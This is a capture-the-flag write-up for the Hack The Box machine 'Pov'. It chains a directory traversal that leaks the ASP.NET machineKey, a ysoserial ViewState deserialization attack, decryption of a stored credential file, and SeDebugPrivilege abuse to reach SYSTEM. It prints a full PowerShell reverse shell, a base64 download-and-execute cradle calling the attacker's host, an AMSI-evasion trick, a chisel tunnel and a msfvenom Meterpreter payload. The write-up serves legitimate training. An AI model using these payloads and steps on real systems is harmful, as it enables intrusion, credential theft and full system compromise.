---
layout: writeup
category: HTB
chall_description: https://app.hackthebox.com/machines/Pov
points: 0
solves: 2489
tags: Windows Deserialization
date: 2024-06-16
comments: true
---

![pov](/assets/images/POV/pov.png)

# Introduction
**POV** is a Windows medium difficulty box that features exploitation of an IIS webpage vulnerable to file read and directory traversal coded in `ASP.NET`. Leaking the secreds used for `VIEWSTATE` and using `ysoserial` to make a malicious `.NET` payload can be used to gain shell access as `sfitz` on the server. User pivoting can be achieved by decoding the password contained on a XML file. After gaining access as `alaading` we can escalate our privileges by abusing the `SeDebugPrivilege`, that will grant us code execution as Administrator.

# Enumeration
As always we start with the `nmap`:

```bash
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.251
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-16 20:33 CEST
Initiating SYN Stealth Scan at 20:33
Scanning 10.10.11.251 [65535 ports]
Discovered open port 80/tcp on 10.10.11.251
Completed SYN Stealth Scan at 20:34, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.10.11.251
Host is up, received user-set (0.045s latency).
Scanned at 2024-06-16 20:33:48 CEST for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 17 (748B)
```

## HTTP - 80/tcp
Here from the output we can only retrieve port 80, hosting a static web page:

![web](/assets/images/POV/1.png)

At the bottom of the page we can notice a `dev.pov.htb` being mentioned:

![dev.pov.htb](/assets/images/POV/2.png)

Let's add that into our `/etc/hosts` file and check it out:

![dev_page](/assets/images/POV/3.png)

Scrolling down we notice a `Download` button. If we intercept that request with BurpSuite, we can see it's downloading a file named `cv.pdf`. 

![cv](/assets/images/POV/4.png)

If this functionallity is not well coded, we can easily get to disclose files on the system:

![fd](/assets/images/POV/5.png)

If we take a look at `index.aspx.cs` we can see it's trying to prevent file disclosure by replacin `../` with an empty string:

```cs
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text.RegularExpressions;
using System.Text;
using System.IO;
using System.Net;

public partial class index : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

    }

    protected void Download(object sender, EventArgs e) {
            
        var filePath = file.Value;
        filePath = Regex.Replace(filePath, "../", ""); // Here we can see it's replacing "../" with "" (an empty string)
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
        Response.TransmitFile(filePath);
        Response.End();   

    }
}
```

# Foothold - shell as sfitz
An important file to read when pentesting an IIS server is the `web.config` file:

![webconfig](/assets/images/POV/6.png)

> IIS here is configured to think that the root path is `C:\inetpub\wwwroot`, so if we try to do path traversal with `..\..\..\Windows\System32\drivers\etc\hosts` won't work; So that's why we need to provide full paths of the files we want to read. 

To see it more clearly, we can display the XML file here:

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

With these data we can proceed to create a malicious payload that will send a reverse shell into our Kali box. First, we'll put our IP and port on the powershell file:

```powershell
$bee=New-Object System.Net.Sockets.TCPClient('10.10.14.187',9001);$ant=$bee.GetStream();[byte[]]$cat=0..65535|%{0};while(($dog=$ant.Read($cat,0,$cat.Length))-ne 0){;$elephant=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($cat,0,$dog);$fox=(iex $elephant 2>&1|Out-String);$gorilla=$fox+'PS '+(pwd).Path+'> ';$hippo=([text.encoding]::ASCII).GetBytes($gorilla);$ant.Write($hippo,0,$hippo.Length);$ant.Flush()};$bee.Close()
```

> I use animal names for funcions since it's a lazy way to AMSI bypass

Now we'll encode the command in base 64 and start a python web server:

```bash
❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.187/shell.ps1')" | iconv -t utf-16le | base64 -w 0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOAA3AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==  

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After that I'll move into my Windows 10 VM (with Windows Defender disabled) and run [ysoserial](https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip):

```powershell
PS C:\Users\ruycr4ft\Documents\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOAA3AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA=="
CRmElUudGYSdaHfCQ6r1N6LHP5brHCAqHoRzmg2ghhDCxYJOLFKjiblGG239W4e0XwjON3MTKyMdQA173LS6bfbTtYp%2FL8HW3xgWyth8oJFARYV0UeIRnEqOWC64GR1nUG0LQ1LyrC2iGZyrZZuZv3nFdjquRdNoCWNPKxIEMH1GttzvQftIOdRj4E4HEMdrI2HkNfP37CNlSMdKwpAOOdt22BSd%2FgYGXErf7Po1M7NaNw2XCjUQju4cSwzmyZequmNRIY7cY31tHnjHgsbsC2R1ZlGNw6x4Cdf7%2Bf8AT9OYa3j5JuZdGd9miF6FeAeHXibfwfBnxHV3R8LJEvlekpL%2BzjByBnSKMaCojn%2FT1S92kRvVNa1NwTY805sisQcBHXPtychsbSzpOa1mIQUpSK0cq%2FRjMPzudFM4p3%2FSNjOWyCq%2BuRlJNUj%2B9SfjgrH4MbZI4tjtW8wp2g3pgze7QrigI5iDuqHYJVAHz8cyapX7yaHmGwjfiz8bpJKxP7FuGHmoju0i5VU9BMvWj%2ByFKUn8DqWhgHSxK9xGfI3H7Qu5FgEllnpulpvqgIB427p2vnDoHp1plGh8aSHrY%2BtkuAcH1AKKO7FI3qA41Pdej2tV5bxDsfOB6C47I5OkB3iH2NqZZHvi0YyVJrtxRmQOK4sw0yihYIQqpI1nZXzeQ4T7vhVRRdNyQAvxVjo8toEDc56bA5oe9F4s1t5eI5AFd0%2FTU6zTG19gM2HZg0XlLBwWX7wLlg4cEegeHOI2vOpUaiPcnU1H5nE0VDJQa3m6oMoRaGN0xCry50dpJquc9Opd%2Bqk4rtKcK7kup8sUKp6K942%2BK1g8By21Jo8R4j5YZMdN1q6Nyzbuu%2BODlnGxSV%2Fti35U3mJQ2Xjowuqc3FkCkicOw89vsGIzIXlfZbm5%2FRcOvJhEJ5z%2FotAXIB5N%2FyTf9u7XSm17zq2odX1h8ONzLu8sHvGo%2B7uGs65H%2FCJA%2FgOzp2Xz5dxytImMOEgRqYmO6JgFxEMc7gobERkvkYU0F1q4Th5WJ8b0oq0LiiLnCgu8r6VwrgeznjVgy9FT6Zc2ml8ecr2d0gHn5xgN4kyDm6%2BisZaE7h6Ub8TVA2gqfMvKWyR04hdyzJu9fhMhUFJl5plsm74%2BmaxAHiu6J34U4ojA0YR8aRUGK11NJEQvcz5xC7u%2FWOfdI3%2F26vlKFBujarCbpUg32XvWSFesBsLy7TGD%2B70qoASqDBqZR6Gi5R70NWwTVqIxKW2Ys9uRCDLzv4iFTSkz%2BNiz9l8G0vWZAdaRS7lmAYZEdTMppVa6xZumnhJi%2BGbpreX5lq%2B7LYozWrDzynmRddtkVr9LbVBI%2BxIbUkjjtjpfVgY4F5WNWR%2FIj57qTCG0E6ZRxvDNK1kQCMFuKnPSwRLhQn9Ez%2Bc1WtfGE5PF5IGpASqxP8doIcN%2BrzOQu0Ypx5tofjc4lWWy%2FUVKaeWIipxPKDChysNFSiC%2FP2jGNYaTV3hOPhjjoMp4E1eRIdm5MPT452bKUetQjhatHoydMGw9vxol4DIKm%2BrVlvX4igjIwYhPj%2Fy03UmsYrZfj875OTS8yTUZt15oPscVsX6gAYb0rbrD%2BIDAOD3%2F4qdVFcc4NiRu%2FX%2FbLLID%2B%2FR9%2FUDbso4aDAo%2FAqhxAhFd6u9pidVjcr4HvC%2Bhvh%2F5UhWtp4aVNtQ8IePaCrNDXIqpSsyWD%2F1nF5vWXd%2B7NzYCJE%2BAgmrAfu7PXMfzbX7HMR1BWN52Vzn9NyVK37I01Ai66naq9a6Oh%2Bne20jx%2FvbwryOk63nCOd%2FjZUp%2Fa20ArJBOS5DrgNSRcUjSr0V9MOPuB4Xc1LiUWUxKAa6yzihcjdpTcWZl723vSXe65U9JBoHBoH9d4X%2FL2gnDs6N1aXb%2FnApiVmm98ekIeMOzQZaelDDdZgHTpYA4R8JOt3P8KSoO8UrLzXXMx5MKAu0TyYij3Fl3TCCMNBricBvP4yrGW3VDG%2FuEkv3fFmxZM4IrtR1q7QcEz86v3XtDdxJ98Pez6CJZ56woggzwjCDwm0XHOQQIGkgW0T0AEEcJ4t0wSsBfGND9xtCBgWwlGeudT4%2FcJlQ0e2KlJtDn9nfA9B%2BdE7B3etpJgPiccJrWw3NcdgyT7Y4VUZAN0A0uLvlFqdHacbm%2BMo%2B6Fm%2B1dhvFvpnOiHzNLkcgFmJcsl%2BY6vcOK4lMBbbDaKu%2F0TXY8GZs%2By9duoKZxLplnT4BVmLaRI2A
PS C:\Users\ruycr4ft\Documents\ysoserial\Release>
```

Alright, so we can grab that payload and replace it for the current `_VIEWSTATE` parameter on the web request. When we send the request, we should get a reverse shell:

```bash
❯ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.11.251] 49685

PS C:\windows\system32\inetsrv> whoami
pov\sfitz
PS C:\windows\system32\inetsrv> 
```

# Lateral movement to alaading
Looking at our privileges reveals that Stephen Fitz is part of the `IIS APPPOOL` group; however he doesn't have the `SeImpersonatePrivilege` privilege:

```powershell
PS C:\Users\sfitz\Desktop> whoami /all

USER INFORMATION
----------------

User Name SID                                          
========= =============================================
pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\sfitz\Desktop> 
```

Here's an [explanation](https://decoder.cloud/2020/11/05/hands-off-my-service-account/) on how this patch works. However, on sfitz's documents folder we can find an interesting XML file:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

This is a `PSCredential` file for alaading. We can easily decrypt the password with powershell:

```powershell
PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
PS C:\Users\sfitz\Documents> 
```

Now I'll mount my SMB server into `x:\` to copy RunasCs from there and get a shell as alaading:

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support -username ruycr4ft -password ruycr4ft
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```powershell
PS C:\Users\sfitz\Documents> net use x: \\10.10.14.187\smbFolder /user:ruycr4ft ruycr4ft
The command completed successfully.
PS C:\Users\sfitz\Documents> copy x:\RunasCs.exe C:\ProgramData\RunasCs.exe
PS C:\Users\sfitz\Documents> ls C:\ProgramData


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d---s-       10/26/2023   2:01 PM                Microsoft                                                             
d-----       10/26/2023   2:04 PM                Package Cache                                                         
d-----       10/26/2023   3:07 PM                regid.1991-06.com.microsoft                                           
d-----        9/15/2018  12:19 AM                SoftwareDistribution                                                  
d-----        11/5/2022  12:03 PM                ssh                                                                   
d-----        9/15/2018  12:19 AM                USOPrivate                                                            
d-----        11/5/2022  12:03 PM                USOShared                                                             
d-----       10/26/2023   2:04 PM                VMware                                                                
-a----        1/27/2024  12:49 PM          51712 RunasCs.exe                                                           


PS C:\Users\sfitz\Documents> 
```

And now we get a shell as alaading:

```powershell
PS C:\ProgramData> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.187:443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-fa27b$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4288 created in background.
PS C:\ProgramData> 
```

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.11.251] 49687
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
pov\alaading
PS C:\Windows\system32> 
```

# Privilege escalation
Now as alaading on the box we have different privileges:

```powershell
PS C:\Windows\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Windows\system32> 
```

We can notice `SeDebugPrivilege` is now enabled. There's a post from [2008](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) that talks about escalating our privileges with this right. What this basically is, it's a privilege that allow us to debug processes owned by other users; with this, we can inject code in a system-owned process to get command execution as this account. On this writeup I'll cover two methods.

## Method 1: psgetsys.ps1
On HackTricks, there's an [specific section](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege) dedicated to this abuse. Here they give us the way to do it:

![rce](/assets/images/POV/7.png)

I'll download [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) into my Kali box and upload it using the Evil-WinRM tool. Before that we need to create a tunnel for port 5985 (WinRM):

```powershell
.\chisel.exe client 10.10.14.187:1234 R:5985:127.0.0.1:5985
```

```bash
❯ chisel server --reverse --port 1234
2024/06/16 21:51:25 server: Reverse tunnelling enabled
2024/06/16 21:51:25 server: Fingerprint zLQQ87B0H9Yot2RVehrPkFbAuJzBgaZ71AZOt+t97WQ=
2024/06/16 21:51:25 server: Listening on http://0.0.0.0:1234
2024/06/16 21:51:59 server: session#1: Client version (1.8.1) differs from server version (1.8.1-0kali2)
2024/06/16 21:51:59 server: session#1: tun: proxy#R:5985=>5985: Listening
```

Now we can connect:

```bash
❯ evil-winrm -i 127.0.0.1 -u alaading -p f8gQ8fynP44ek1m3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

After that we can upload the powershell script:

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> upload psgetsys.ps1                     
Info: Uploading /home/ruycr4ft/Documents/Hacking/HTB/Machines/Pov/content/psgetsys.ps1 to C:\Users\alaading\Documents\psgetsys.ps1                        
Data: 7900 bytes of 7900 bytes copied                       
Info: Upload successful!
*Evil-WinRM* PS C:\Users\alaading\Documents> ls

    Directory: C:\Users\alaading\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2024  12:54 PM           5926 psgetsys.ps1

*Evil-WinRM* PS C:\Users\alaading\Documents> Import-Module .\psgetsys.ps1
*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

Now we need to get the PID for the `winlogon` process, which is owned by system:

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> ps winlogon
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    255      12     2640      15896       0.14    552   1 winlogon

*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

Great, so with that, we'll grab our earlier encoded powershell command to get a shell as sfitz to run it as system:

```powershell
*Evil-WinRM* PS C:\Users\alaading\Documents> ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -enc <ENCODED COMMAND>"
*Evil-WinRM* PS C:\Users\alaading\Documents> 
```

After running that, we get a shell as `NT AUTHORITY\SYSTEM`:

```bash
❯ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.11.251] 49701

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> 
```

From here we can reed the root flag in `C:\Users\Administrator\Desktop\root.txt`.

## Method 2: Metasploit
Alright so we managed to root the box with the "manual" method (I say manual in quotes since we literally ran a script that we didn't know what it did; feel free to read the code, it's actually very interesting how it works). Now we can go with an even more automated way to root it, which is using the metasploit framework. 
First of all, I'll create a reverse shell binary with `msfvenom`:

```bash
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.187 LPORT=9001 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

After that let's start `msfconsole` and set up all the options:

> You obviously need to copy `rev.exe` to the victim box; I used the earlier mounted volume I created.

```bash
❯ msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.187
LHOST => 10.10.14.187
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.187:9001 
```

After running `rev.exe` on POV, we should get a shell:

```bash
[*] Sending stage (200774 bytes) to 10.10.11.251
[*] Meterpreter session 1 opened (10.10.14.187:9001 -> 10.10.11.251:49704) at 2024-06-16 22:07:19 +0200

meterpreter > getuid
Server username: POV\alaading
meterpreter > 
```

Since we have the right to debug other user's processes, we can simply migrate to WinLogon's PID (which we found earlier):

```bash
meterpreter > migrate -P 552
[*] Migrating from 4072 to 552...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

From here we can read the root flag as well.

# Conclusions
I was actually very confused when doing this box on how this kind of attacks weren't shown before on HTB. I really liked this box, and kudos for the creator! Take care and I'll see you all next time.